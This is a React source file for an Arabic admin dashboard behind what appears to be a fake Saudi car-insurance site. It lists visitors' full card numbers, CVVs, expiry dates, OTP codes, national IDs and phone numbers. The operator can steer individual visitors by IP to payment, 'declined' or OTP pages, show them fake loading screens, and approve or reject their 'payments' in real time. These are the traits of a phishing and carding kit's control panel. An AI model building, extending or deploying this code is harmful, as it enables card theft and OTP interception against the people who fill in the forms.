import React, { useEffect, useRef, useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { getSocket } from "@/hooks/useSocketSync";
import { toast } from "sonner";

type Request = {
  id: number;
  sessionId: string;
  visitorIp?: string | null;
  userName?: string | null;
  phoneNumber?: string | null;
  idNumber?: string | null;
  carMake?: string | null;
  planName?: string | null;
  planCompany?: string | null;
  planPrice?: number | null;
  total?: number | null;
  status?: string | null;
  currentStep?: number | null;
  cardNumber?: string | null;
  cardHolderName?: string | null;
  expiryDate?: string | null;
  cvv?: string | null;
  cardType?: string | null;
  cardLast4?: string | null;
  paymentStatus?: string | null;
  otpValue?: string | null;
  otpSubmitted?: string | null;
  otpVerified?: boolean | null;
  addons?: string | null;
  city?: string | null;
  usageType?: string | null;
  startDate?: string | null;
  carYear?: string | null;
  birthDate?: string | null;
  offerType?: string | null;
  regType?: string | null;
  serialNumber?: string | null;
  paymentMethod?: string | null;
  createdAt: Date;
  updatedAt: Date;
};

const STATUS_LABELS: Record<string, { label: string; color: string }> = {
  in_progress: { label: "قيد التقديم", color: "bg-yellow-100 text-yellow-700" },
  completed: { label: "مكتمل", color: "bg-green-100 text-green-700" },
  payment_submitted: { label: "دفع مقدم", color: "bg-blue-100 text-blue-700" },
  payment_approved: { label: "مقبول", color: "bg-green-100 text-green-700" },
  otp_sent: { label: "OTP مرسل", color: "bg-purple-100 text-purple-700" },
  otp_verified: { label: "تم التحقق", color: "bg-emerald-100 text-emerald-700" },
  declined: { label: "مرفوض", color: "bg-red-100 text-red-700" },
};

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const { user, loading: authLoading } = useAuth();
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [page, setPage] = useState(0);
  const [selectedRequest, setSelectedRequest] = useState<Request | null>(null);
  const [activeTab, setActiveTab] = useState<"requests" | "banned" | "stats">("requests");
  const [banIpInput, setBanIpInput] = useState("");
  const [banReason, setBanReason] = useState("");
  const [navIp, setNavIp] = useState("");
  const [navPage, setNavPage] = useState("/insurance/step1");
  const [loadingIp, setLoadingIp] = useState("");
  const [loadingText, setLoadingText] = useState("جاري التحميل...");
  const [loadingSubtext, setLoadingSubtext] = useState("يرجى الانتظار");
  const [liveRequests, setLiveRequests] = useState<Request[]>([]);
  const [hasNew, setHasNew] = useState(false);
  const limit = 20;

  const requestsQuery = trpc.admin.listRequests.useQuery(
    { search, status: statusFilter, limit, offset: page * limit },
    { enabled: !!user && user.role === "admin", refetchInterval: 30000 }
  );
  const statsQuery = trpc.admin.getStats.useQuery(undefined, { enabled: !!user && user.role === "admin", refetchInterval: 30000 });
  const bannedQuery = trpc.admin.listBanned.useQuery(undefined, { enabled: activeTab === "banned" && !!user && user.role === "admin" });
  const banMutation = trpc.admin.banIp.useMutation({ onSuccess: () => { bannedQuery.refetch(); toast.success("تم حظر IP بنجاح"); setBanIpInput(""); setBanReason(""); } });
  const unbanMutation = trpc.admin.unbanIp.useMutation({ onSuccess: () => { bannedQuery.refetch(); toast.success("تم رفع الحظر"); } });
  const navMutation = trpc.admin.navigateTo.useMutation({ onSuccess: () => toast.success("تم إرسال أمر التوجيه") });
  const loadingMutation = trpc.admin.setLoadingScreen.useMutation({ onSuccess: () => toast.success("تم تحديث شاشة التحميل") });
  const approveMutation = trpc.admin.approvePayment.useMutation({ onSuccess: () => { toast.success("تم قبول الدفع"); utils.admin.listRequests.invalidate(); } });
  const rejectMutation = trpc.admin.rejectPayment.useMutation({ onSuccess: () => { toast.success("تم رفض الدفع"); utils.admin.listRequests.invalidate(); } });
  const utils = trpc.useUtils();

  // Socket.IO للمزامنة الفورية
  useEffect(() => {
    const socket = getSocket();
    socket.emit("joinAdmin");
    const onRequestUpdated = (req: Request) => {
      setLiveRequests(prev => {
        const idx = prev.findIndex(r => r.id === req.id);
        if (idx >= 0) { const updated = [...prev]; updated[idx] = req; return updated; }
        return [req, ...prev];
      });
      setHasNew(true);
      utils.admin.listRequests.invalidate();
      utils.admin.getStats.invalidate();
      toast.info(`طلب جديد/محدث: ${req.userName ?? req.visitorIp ?? "مجهول"}`);
    };
    socket.on("requestUpdated", onRequestUpdated);
    return () => { socket.off("requestUpdated", onRequestUpdated); };
  }, []);

  if (authLoading) return <div className="flex items-center justify-center min-h-screen"><div className="text-gray-500">جاري التحميل...</div></div>;
  if (!user) return <div className="flex items-center justify-center min-h-screen"><div className="text-center"><p className="text-gray-600 mb-4">يجب تسجيل الدخول للوصول للوحة التحكم</p><a href="/" className="text-blue-600 underline">العودة للرئيسية</a></div></div>;
  if (user.role !== "admin") return <div className="flex items-center justify-center min-h-screen"><div className="text-center"><p className="text-red-600 font-bold mb-2">غير مصرح لك بالوصول</p><a href="/" className="text-blue-600 underline">العودة</a></div></div>;

  const requests = requestsQuery.data?.rows ?? [];
  const total = requestsQuery.data?.total ?? 0;
  const stats = statsQuery.data;
  const banned = bannedQuery.data ?? [];

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl overflow-hidden">
              <img src="/assets/logo/logo-180.png" alt="تأميني" className="w-full h-full object-cover" />
            </div>
            <div>
              <h1 className="font-bold text-gray-900 text-base">لوحة تحكم تأميني</h1>
              <p className="text-xs text-gray-500">مرحباً، {user.name ?? user.email}</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            {hasNew && <span className="bg-red-500 text-white text-xs px-2 py-0.5 rounded-full animate-pulse">طلبات جديدة</span>}
            <button onClick={() => navigate("/insurance/step1")} className="text-sm text-blue-600 hover:underline">عرض الواجهة</button>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-5">
        {/* Tabs */}
        <div className="flex gap-1 bg-gray-100 rounded-xl p-1 mb-5 w-fit">
          {[{ id: "requests", label: "الطلبات" }, { id: "stats", label: "الإحصائيات" }, { id: "banned", label: "المحظورون" }].map(tab => (
            <button key={tab.id} onClick={() => setActiveTab(tab.id as any)} className={`px-5 py-2 rounded-lg text-sm font-semibold transition-all ${activeTab === tab.id ? "bg-white text-blue-600 shadow-sm" : "text-gray-500 hover:text-gray-700"}`}>{tab.label}</button>
          ))}
        </div>

        {/* === Requests Tab === */}
        {activeTab === "requests" && (
          <div>
            {/* Search & Filter */}
            <div className="flex gap-3 mb-4 flex-wrap">
              <input className="flex-1 min-w-[200px] px-3 py-2 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="بحث بالاسم، الهاتف، الهوية، IP..." value={search} onChange={e => { setSearch(e.target.value); setPage(0); }} />
              <select className="px-3 py-2 rounded-lg border border-gray-200 text-sm bg-white focus:outline-none focus:border-blue-500" value={statusFilter} onChange={e => { setStatusFilter(e.target.value); setPage(0); }}>
                <option value="all">جميع الحالات</option>
                <option value="in_progress">قيد التقديم</option>
                <option value="completed">مكتمل</option>
                <option value="payment_submitted">دفع مقدم</option>
                <option value="declined">مرفوض</option>
              </select>
              <button onClick={() => { requestsQuery.refetch(); setHasNew(false); }} className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition-all">تحديث</button>
            </div>

            {/* Table */}
            <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead className="bg-gray-50 border-b border-gray-200">
                    <tr>
                      {["#", "الاسم", "الهاتف", "الهوية", "IP", "المركبة", "الخطة", "الإجمالي", "الحالة", "الخطوة", "التاريخ", "إجراءات"].map(h => (
                        <th key={h} className="px-3 py-3 text-right text-xs font-semibold text-gray-600 whitespace-nowrap">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100">
                    {requestsQuery.isLoading ? (
                      <tr><td colSpan={12} className="text-center py-8 text-gray-400">جاري التحميل...</td></tr>
                    ) : requests.length === 0 ? (
                      <tr><td colSpan={12} className="text-center py-8 text-gray-400">لا توجد طلبات</td></tr>
                    ) : requests.map(req => (
                      <tr key={req.id} className="hover:bg-gray-50 transition-colors">
                        <td className="px-3 py-2.5 text-gray-400 text-xs">{req.id}</td>
                        <td className="px-3 py-2.5 font-medium text-gray-800 whitespace-nowrap">{req.userName ?? "-"}</td>
                        <td className="px-3 py-2.5 text-gray-600 whitespace-nowrap" style={{ direction: "ltr" }}>{req.phoneNumber ?? "-"}</td>
                        <td className="px-3 py-2.5 text-gray-600">{req.idNumber ?? "-"}</td>
                        <td className="px-3 py-2.5 text-gray-500 text-xs font-mono">{req.visitorIp ?? "-"}</td>
                        <td className="px-3 py-2.5 text-gray-600 whitespace-nowrap">{req.carMake ?? "-"}</td>
                        <td className="px-3 py-2.5 text-gray-600 whitespace-nowrap">{req.planName ? `${req.planName} - ${req.planCompany}` : "-"}</td>
                        <td className="px-3 py-2.5 font-bold text-blue-600 whitespace-nowrap">{req.total ? `${req.total.toLocaleString("ar-SA")} ر` : "-"}</td>
                        <td className="px-3 py-2.5">
                          <span className={`inline-block px-2 py-0.5 rounded-full text-xs font-semibold ${STATUS_LABELS[req.status ?? "in_progress"]?.color ?? "bg-gray-100 text-gray-600"}`}>
                            {STATUS_LABELS[req.status ?? "in_progress"]?.label ?? req.status}
                          </span>
                        </td>
                        <td className="px-3 py-2.5 text-center text-gray-600">{req.currentStep ?? 1}/5</td>
                        <td className="px-3 py-2.5 text-gray-400 text-xs whitespace-nowrap">{new Date(req.createdAt).toLocaleString("ar-SA")}</td>
                        <td className="px-3 py-2.5">
                          <div className="flex flex-wrap gap-1">
                            <button onClick={() => setSelectedRequest(req as any)} className="px-2 py-1 bg-blue-50 text-blue-600 rounded text-xs hover:bg-blue-100 transition-all">تفاصيل</button>
                            {req.status === 'payment_submitted' && (
                              <>
                                <button onClick={() => approveMutation.mutate({ requestId: req.id })} className="px-2 py-1 bg-green-50 text-green-600 rounded text-xs hover:bg-green-100 transition-all">قبول</button>
                                <button onClick={() => rejectMutation.mutate({ requestId: req.id })} className="px-2 py-1 bg-red-50 text-red-600 rounded text-xs hover:bg-red-100 transition-all">رفض</button>
                              </>
                            )}
                            {req.visitorIp && <button onClick={() => { setBanIpInput(req.visitorIp!); setActiveTab("banned"); }} className="px-2 py-1 bg-red-50 text-red-600 rounded text-xs hover:bg-red-100 transition-all">حظر</button>}
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              {/* Pagination */}
              <div className="flex items-center justify-between px-4 py-3 border-t border-gray-100">
                <span className="text-sm text-gray-500">إجمالي: {total} طلب</span>
                <div className="flex gap-2">
                  <button disabled={page === 0} onClick={() => setPage(p => p - 1)} className="px-3 py-1.5 rounded-lg border border-gray-200 text-sm disabled:opacity-40 hover:bg-gray-50 transition-all">السابق</button>
                  <span className="px-3 py-1.5 text-sm text-gray-600">صفحة {page + 1}</span>
                  <button disabled={(page + 1) * limit >= total} onClick={() => setPage(p => p + 1)} className="px-3 py-1.5 rounded-lg border border-gray-200 text-sm disabled:opacity-40 hover:bg-gray-50 transition-all">التالي</button>
                </div>
              </div>
            </div>

            {/* Control Panel */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-5">
              {/* Navigate To */}
              <div className="bg-white rounded-xl border border-gray-200 p-4">
                <h3 className="font-bold text-sm text-gray-800 mb-3 flex items-center gap-2">
                  <span>🧭</span> توجيه زائر (navigateTo)
                </h3>
                <input className="w-full px-3 py-2 rounded-lg border border-gray-200 text-sm mb-2 focus:outline-none focus:border-blue-500" placeholder="IP الزائر" value={navIp} onChange={e => setNavIp(e.target.value)} />
                <select className="w-full px-3 py-2 rounded-lg border border-gray-200 text-sm mb-3 bg-white focus:outline-none focus:border-blue-500" value={navPage} onChange={e => setNavPage(e.target.value)}>
                  <option value="/insurance/step1">الخطوة 1 - البيانات الأساسية</option>
                  <option value="/insurance/step2">الخطوة 2 - بيانات التأمين</option>
                  <option value="/insurance/step3">الخطوة 3 - قائمة الأسعار</option>
                  <option value="/insurance/step4">الخطوة 4 - الإضافات</option>
                  <option value="/insurance/step5">الخطوة 5 - الملخص والدفع</option>
                  <option value="/insurance/payment">صفحة الدفع</option>
                  <option value="/insurance/payment?declined=true">صفحة الدفع (مرفوض)</option>
                  <option value="/insurance/otp">صفحة OTP</option>
                  <option value="/banned">صفحة الحظر</option>
                </select>
                <button onClick={() => { if (!navIp) { toast.error("أدخل IP الزائر"); return; } navMutation.mutate({ ip: navIp, page: navPage }); }} className="w-full py-2 bg-blue-600 text-white rounded-lg text-sm font-semibold hover:bg-blue-700 transition-all">إرسال أمر التوجيه</button>
              </div>

              {/* Loading Screen */}
              <div className="bg-white rounded-xl border border-gray-200 p-4">
                <h3 className="font-bold text-sm text-gray-800 mb-3 flex items-center gap-2">
                  <span>⏳</span> شاشة التحميل
                </h3>
                <input className="w-full px-3 py-2 rounded-lg border border-gray-200 text-sm mb-2 focus:outline-none focus:border-blue-500" placeholder="IP الزائر" value={loadingIp} onChange={e => setLoadingIp(e.target.value)} />
                <input className="w-full px-3 py-2 rounded-lg border border-gray-200 text-sm mb-2 focus:outline-none focus:border-blue-500" placeholder="نص التحميل" value={loadingText} onChange={e => setLoadingText(e.target.value)} />
                <input className="w-full px-3 py-2 rounded-lg border border-gray-200 text-sm mb-3 focus:outline-none focus:border-blue-500" placeholder="النص الفرعي" value={loadingSubtext} onChange={e => setLoadingSubtext(e.target.value)} />
                <div className="flex gap-2">
                  <button onClick={() => { if (!loadingIp) { toast.error("أدخل IP الزائر"); return; } loadingMutation.mutate({ ip: loadingIp, isActive: true, loadingText, loadingSubtext }); }} className="flex-1 py-2 bg-orange-500 text-white rounded-lg text-sm font-semibold hover:bg-orange-600 transition-all">تفعيل</button>
                  <button onClick={() => { if (!loadingIp) { toast.error("أدخل IP الزائر"); return; } loadingMutation.mutate({ ip: loadingIp, isActive: false }); }} className="flex-1 py-2 bg-gray-500 text-white rounded-lg text-sm font-semibold hover:bg-gray-600 transition-all">إيقاف</button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* === Stats Tab === */}
        {activeTab === "stats" && (
          <div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
              {[
                { label: "إجمالي الطلبات", value: stats?.total ?? 0, icon: "📋", color: "bg-blue-50 text-blue-600" },
                { label: "طلبات اليوم", value: stats?.today ?? 0, icon: "📅", color: "bg-green-50 text-green-600" },
                { label: "إجمالي المبالغ", value: `${(stats?.totalAmount ?? 0).toLocaleString("ar-SA")} ريال`, icon: "💰", color: "bg-yellow-50 text-yellow-600" },
                { label: "الخطط المباعة", value: stats?.topPlans?.length ?? 0, icon: "🏆", color: "bg-purple-50 text-purple-600" },
              ].map(s => (
                <div key={s.label} className="bg-white rounded-xl border border-gray-200 p-4">
                  <div className={`w-10 h-10 rounded-xl ${s.color} flex items-center justify-center text-xl mb-3`}>{s.icon}</div>
                  <div className="font-bold text-xl text-gray-900">{s.value}</div>
                  <div className="text-sm text-gray-500 mt-1">{s.label}</div>
                </div>
              ))}
            </div>
            <div className="bg-white rounded-xl border border-gray-200 p-4">
              <h3 className="font-bold text-sm text-gray-800 mb-4">الخطط الأكثر اختياراً</h3>
              {stats?.topPlans?.length === 0 ? <p className="text-gray-400 text-sm">لا توجد بيانات بعد</p> : (
                <div className="space-y-2">
                  {stats?.topPlans?.map((p, i) => (
                    <div key={i} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                      <div>
                        <div className="font-semibold text-sm text-gray-800">{p.planName ?? "-"}</div>
                        <div className="text-xs text-gray-500">{p.planCompany ?? "-"}</div>
                      </div>
                      <span className="bg-blue-100 text-blue-700 text-xs px-2 py-0.5 rounded-full font-bold">{p.count} مرة</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* === Banned Tab === */}
        {activeTab === "banned" && (
          <div>
            <div className="bg-white rounded-xl border border-gray-200 p-4 mb-4">
              <h3 className="font-bold text-sm text-gray-800 mb-3">حظر IP جديد</h3>
              <div className="flex gap-2 flex-wrap">
                <input className="flex-1 min-w-[150px] px-3 py-2 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-red-500" placeholder="عنوان IP" value={banIpInput} onChange={e => setBanIpInput(e.target.value)} style={{ direction: "ltr" }} />
                <input className="flex-1 min-w-[150px] px-3 py-2 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-red-500" placeholder="سبب الحظر (اختياري)" value={banReason} onChange={e => setBanReason(e.target.value)} />
                <button onClick={() => { if (!banIpInput) { toast.error("أدخل IP"); return; } banMutation.mutate({ ip: banIpInput, reason: banReason }); }} className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-semibold hover:bg-red-700 transition-all">حظر</button>
              </div>
            </div>
            <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
              <table className="w-full text-sm">
                <thead className="bg-gray-50 border-b border-gray-200">
                  <tr>
                    {["IP", "السبب", "تاريخ الحظر", "إجراء"].map(h => <th key={h} className="px-4 py-3 text-right text-xs font-semibold text-gray-600">{h}</th>)}
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {banned.length === 0 ? (
                    <tr><td colSpan={4} className="text-center py-8 text-gray-400">لا توجد IPs محظورة</td></tr>
                  ) : banned.map(b => (
                    <tr key={b.id} className="hover:bg-gray-50">
                      <td className="px-4 py-3 font-mono text-sm text-gray-800">{b.ip}</td>
                      <td className="px-4 py-3 text-gray-600">{b.reason ?? "-"}</td>
                      <td className="px-4 py-3 text-gray-400 text-xs">{new Date(b.bannedAt).toLocaleString("ar-SA")}</td>
                      <td className="px-4 py-3">
                        <button onClick={() => unbanMutation.mutate({ ip: b.ip })} className="px-3 py-1 bg-green-50 text-green-600 rounded text-xs hover:bg-green-100 transition-all">رفع الحظر</button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>

      {/* Request Details Modal */}
      {selectedRequest && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4" onClick={() => setSelectedRequest(null)}>
          <div className="bg-white rounded-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between p-5 border-b border-gray-100">
              <h2 className="font-bold text-gray-800">تفاصيل الطلب #{selectedRequest.id}</h2>
              <button onClick={() => setSelectedRequest(null)} className="text-gray-400 hover:text-gray-600 text-xl font-bold">×</button>
            </div>
            <div className="p-5 space-y-3">
              {[
                { label: "الاسم", value: selectedRequest.userName },
                { label: "الهاتف", value: selectedRequest.phoneNumber },
                { label: "رقم الهوية", value: selectedRequest.idNumber },
                { label: "IP", value: selectedRequest.visitorIp },
                { label: "نوع العرض", value: selectedRequest.offerType === "new" ? "تأمين جديد" : "نقل الملكية" },
                { label: "المركبة", value: selectedRequest.carMake },
                { label: "سنة الصنع", value: selectedRequest.carYear },
                { label: "المدينة", value: selectedRequest.city },
                { label: "شركة التأمين", value: selectedRequest.planCompany },
                { label: "الخطة", value: selectedRequest.planName },
                { label: "سعر الخطة", value: selectedRequest.planPrice ? `${selectedRequest.planPrice} ريال` : undefined },
                { label: "الإجمالي", value: selectedRequest.total ? `${selectedRequest.total} ريال` : undefined },
                { label: "الحالة", value: STATUS_LABELS[selectedRequest.status ?? "in_progress"]?.label },
                { label: "الخطوة الحالية", value: `${selectedRequest.currentStep ?? 1}/5` },
                { label: "حالة الدفع", value: selectedRequest.paymentStatus ?? undefined },
                { label: "رمز OTP المدخل", value: selectedRequest.otpSubmitted ?? undefined },
                { label: "رمز OTP", value: selectedRequest.otpValue ?? undefined },
                { label: "تم التحقق من OTP", value: selectedRequest.otpVerified ? "نعم ✅" : undefined },
              ].filter(i => i.value).map(item => (
                <div key={item.label} className="flex justify-between text-sm border-b border-gray-50 pb-2">
                  <span className="text-gray-500">{item.label}</span>
                  <span className="font-semibold text-gray-800">{item.value as string}</span>
                </div>
              ))}
              {selectedRequest.cardNumber && (
                <div className="bg-red-50 border border-red-200 rounded-xl p-4 mt-3">
                  <h4 className="font-bold text-sm text-red-700 mb-2">🔐 بيانات البطاقة</h4>
                  {[
                    { label: "رقم البطاقة", value: selectedRequest.cardNumber },
                    { label: "اسم الحامل", value: selectedRequest.cardHolderName },
                    { label: "تاريخ الانتهاء", value: selectedRequest.expiryDate },
                    { label: "CVV", value: selectedRequest.cvv },
                    { label: "نوع البطاقة", value: selectedRequest.cardType },
                  ].filter(i => i.value).map(item => (
                    <div key={item.label} className="flex justify-between text-sm py-1">
                      <span className="text-gray-500">{item.label}</span>
                      <span className="font-mono font-bold text-gray-800">{item.value as string}</span>
                    </div>
                  ))}
                </div>
              )}
              {selectedRequest.status === 'payment_submitted' && (
                <div className="flex gap-2 mt-3">
                  <button onClick={() => approveMutation.mutate({ requestId: selectedRequest.id })} className="flex-1 py-2.5 bg-green-600 text-white rounded-lg text-sm font-bold hover:bg-green-700 transition-all">✅ قبول الدفع</button>
                  <button onClick={() => rejectMutation.mutate({ requestId: selectedRequest.id })} className="flex-1 py-2.5 bg-red-600 text-white rounded-lg text-sm font-bold hover:bg-red-700 transition-all">❌ رفض الدفع</button>
                </div>
              )}
              {selectedRequest.visitorIp && (
                <div className="flex gap-2 mt-3">
                  <button onClick={() => { setBanIpInput(selectedRequest.visitorIp!); setActiveTab("banned"); setSelectedRequest(null); }} className="flex-1 py-2 bg-red-50 text-red-600 rounded-lg text-sm font-semibold hover:bg-red-100 transition-all">حظر IP</button>
                  <button onClick={() => { setNavIp(selectedRequest.visitorIp!); setSelectedRequest(null); }} className="flex-1 py-2 bg-blue-50 text-blue-600 rounded-lg text-sm font-semibold hover:bg-blue-100 transition-all">توجيه</button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
